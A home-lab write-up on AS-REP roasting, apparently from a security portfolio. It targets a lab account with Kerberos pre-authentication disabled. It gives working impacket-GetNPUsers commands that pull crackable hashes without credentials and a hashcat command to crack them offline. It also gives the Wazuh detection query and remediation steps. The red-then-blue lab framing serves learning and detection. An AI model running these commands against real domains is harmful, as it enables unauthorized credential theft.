# Project 02 — AS-REP Roasting (T1558.004)

Attack `b.otieno` (misconfig #2 — Kerberos pre-authentication disabled), crack the
password offline, then detect it in Wazuh.

---

## 1. Scenario
Normally, to get a Kerberos AS-REP a user must first prove they know their password
(pre-authentication). `b.otieno` has pre-auth **disabled**, so the DC will hand out
that user's AS-REP to *anyone who asks* — and the AS-REP is encrypted with the user's
key, so it's crackable offline. The killer detail: this needs **no valid credentials
at all**, only the username. It's a favourite early-access technique.

**Phase:** Red — power on **KALI01 + DC01** only.

## 2. Attack (from KALI01)
```bash
# No credentials needed - just ask for AS-REPs for accounts without pre-auth.
impacket-GetNPUsers lab.local/ -dc-ip 10.10.10.10 -no-pass -usersfile users.txt \
    -format hashcat -outputfile asrep.hashes
# (users.txt can be a wordlist of likely names; b.otieno will return a hash.)
```
Or target the known account directly:
```bash
impacket-GetNPUsers lab.local/b.otieno -dc-ip 10.10.10.10 -no-pass -format hashcat
```
Expected: a `$krb5asrep$23$b.otieno@LAB.LOCAL:...` hash.

Crack offline (hashcat mode 18200 = AS-REP):
```bash
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

> **What I proved:** I recovered a domain user's password with **zero** starting
> credentials — pure pre-auth misconfiguration abuse.

## 3. Telemetry this generates
On DC01: **Event ID 4768** (Kerberos authentication ticket / AS-REQ) with
**pre-authentication type 0** and RC4. A 4768 with pre-auth type 0 is the tell that an
account isn't requiring pre-auth — normal accounts show pre-auth type 2.

## 4. Detection (in Wazuh — blue phase)
```
data.win.system.eventID:4768 AND data.win.eventdata.preAuthType:0
```
Custom rule `100011` in
[`../../wazuh/custom-rules/local_rules.xml`](../../wazuh/custom-rules/local_rules.xml).

## 5. Remediation
- **Re-enable Kerberos pre-authentication** on every account (it's the default; the
  lab explicitly turned it off). In AD: uncheck "Do not require Kerberos
  preauthentication" on the account, or:
  ```powershell
  Set-ADAccountControl -Identity b.otieno -DoesNotRequirePreAuth $false
  ```
- Audit for `DoesNotRequirePreAuth = True` across the domain regularly.
- Enforce strong passwords so any leaked AS-REP is uncrackable.

## 6. Evidence
- 📸 `GetNPUsers` returning the `b.otieno` AS-REP hash with no password
- 📸 hashcat cracking it
- 📸 Wazuh alert (rule 100011) for the pre-auth-type-0 AS-REQ
